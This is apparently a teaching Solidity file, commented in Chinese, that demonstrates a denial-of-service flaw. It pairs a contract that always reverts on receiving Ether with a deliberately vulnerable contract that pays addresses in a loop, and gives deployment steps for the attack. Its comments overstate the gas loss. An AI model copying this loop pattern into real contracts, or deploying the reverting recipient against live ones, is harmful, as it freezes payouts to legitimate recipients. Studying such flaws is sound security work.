// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/*
  漏洞：Improper Exception Handling in a Loop
  說明：
    當在循環中直接使用 transfer 等操作時，若其中一個 transfer 失敗，會導致整個交易回滾，
    而消耗掉所有的 gas。此範例展示當一個接收者合約（惡意合約）故意在接收 Ether 時
    revert 造成整個分發交易失敗，並且消耗大量 gas。

  攻擊說明：
    1. 部署一個惡意合約 MaliciousRecipient，fallback 函數始終 revert。
    2. 將惡意合約地址加入目標地址陣列 destinations 中，再部署 VulnerableCallsInLoop 合約。
    3. 呼叫 distribute() 分發 Ether 時，當循環走到惡意合約時，transfer 會執行失敗，
       導致整個 distribute() 交易回滾，但所消耗的 gas 不會退還給使用者。
*/

// 惡意接收合約，接收到 Ether 時會 revert，模擬 transfer 失敗情況
contract MaliciousRecipient {
    // 當收到 Ether 時就 revert
    fallback() external payable {
        revert("Attack: Failing fallback");
    }
    
    // 同時也提供 receive 函數，避免有些情況下被誤用
    receive() external payable {
        revert("Attack: Failing receive");
    }
}

contract VulnerableCallsInLoop {
    // 狀態變數：存放目標地址，存在漏洞，因在迴圈中直接使用 transfer 進行 Ether 發送
    address[] public destinations;
    
    // 建構子，傳入一個地址陣列
    constructor(address[] memory newDestinations) {
        destinations = newDestinations;
    }
    
    // 分發 Ether 的函式，使用 for 迴圈進行 transfer，若任何一次 transfer 失敗，會導致整個交易回滾
    function distribute() external payable {
        // 此範例假設 msg.value 必須至少等於 destinations 長度，且每個 transfer 固定發送 1 wei
        require(msg.value >= destinations.length, "Insufficient Ether provided");
        for (uint i = 0; i < destinations.length; i++) {
            // 漏洞重點：直接呼叫 transfer，若某個地址在接受 Ether 時 revert，則整個迴圈失敗
            payable(destinations[i]).transfer(1 wei);
        }
    }
    
    // 接收 Ether 的 fallback function
    receive() external payable {}
}

/*
  攻擊部署與測試步驟：
    1. 部署 MaliciousRecipient 合約，獲取其地址。
    2. 構造一個地址陣列，包含至少一個正常地址和一個惡意地址（MaliciousRecipient 的地址）。
    3. 部署 VulnerableCallsInLoop 合約，並在部署時傳入該地址陣列。
    4. 從外部呼叫 distribute() 並傳入足夠的 Ether，當循環到惡意地址時，transfer 失敗，
       導致整個 distribute() 交易回滾，但消耗的 gas 不會退還。
*/
